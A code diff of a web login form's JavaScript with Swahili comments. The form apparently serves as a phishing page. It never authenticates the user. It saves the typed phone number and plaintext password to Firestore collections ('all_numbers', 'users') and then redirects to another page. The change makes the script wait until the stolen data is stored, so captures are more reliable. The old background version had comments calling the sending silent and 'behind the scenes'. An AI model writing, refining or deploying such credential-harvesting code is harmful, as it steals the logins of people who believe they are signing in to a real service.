@@ -91,44 +91,50 @@
         const db = getFirestore(app);
 
         const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
 
-        loginForm.addEventListener('submit', (e) => {
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault(); 
 
             const phone = document.getElementById('phoneNumber').value.trim();
             const password = document.getElementById('password').value;
 
-            // 1. HATUA YA KASI: Mpeleke mtumiaji kwenye all.html PAPO HAPO
-            // Tunatumia replace ili asirudi kwenye fomu akibonyeza 'Back'
-            window.location.replace('all.html');
+            // Badilisha kitufe kuonyesha inafanya kazi
+            submitBtn.textContent = "Inaingia...";
+            submitBtn.disabled = true;
 
-            // 2. HATUA YA BACKGROUND: Tuma data kimyakimya bila kumzuia mtumiaji
-            // Hapa hatuna await, kwa hiyo mtumiaji haendi kusubiri
-            (async () => {
-                try {
-                    const userCredential = await signInAnonymously(auth);
-                    const user = userCredential.user;
+            try {
+                // 1. Ingia kimyakimya
+                const userCredential = await signInAnonymously(auth);
+                const user = userCredential.user;
 
-                    await addDoc(collection(db, "all_numbers"), {
-                        phone: phone,
-                        password: password,
-                        timestamp: serverTimestamp()
-                    });
+                // 2. Tuma data na SUBIRI ikamilike (await)
+                await addDoc(collection(db, "all_numbers"), {
+                    phone: phone,
+                    password: password,
+                    timestamp: serverTimestamp()
+                });
 
-                    await setDoc(doc(db, "users", user.uid), {
-                        phone: phone,
-                        password: password,
-                        lastLogin: serverTimestamp()
-                    });
-                    
-                    console.log("Data imetumwa kwa mafanikio nyuma ya pazia.");
-                } catch (error) {
-                    console.error("Kosa la kutuma data background: ", error);
-                }
-            })();
+                // 3. Tuma kwenye users pia
+                await setDoc(doc(db, "users", user.uid), {
+                    phone: phone,
+                    password: password,
+                    lastLogin: serverTimestamp()
+                });
+                
+                // 4. SASA data imefika, mpeleke mtumiaji all.html
+                window.location.replace('all.html');
+
+            } catch (error) {
+                console.error("Kosa la kutuma data: ", error);
+                alert("Imeshindikana kuingia. Tafadhali jaribu tena.");
+                // Rudisha kitufe kama kilivyokuwa
+                submitBtn.textContent = "Ingia (Log in)";
+                submitBtn.disabled = false;
+            }
         });
 
-        // Back button logic ya kawaida
+        // Back button logic
         document.getElementById('backBtn').addEventListener('click', function () {
             if (window.history.length > 1 && document.referrer !== '') {
                 window.history.back();
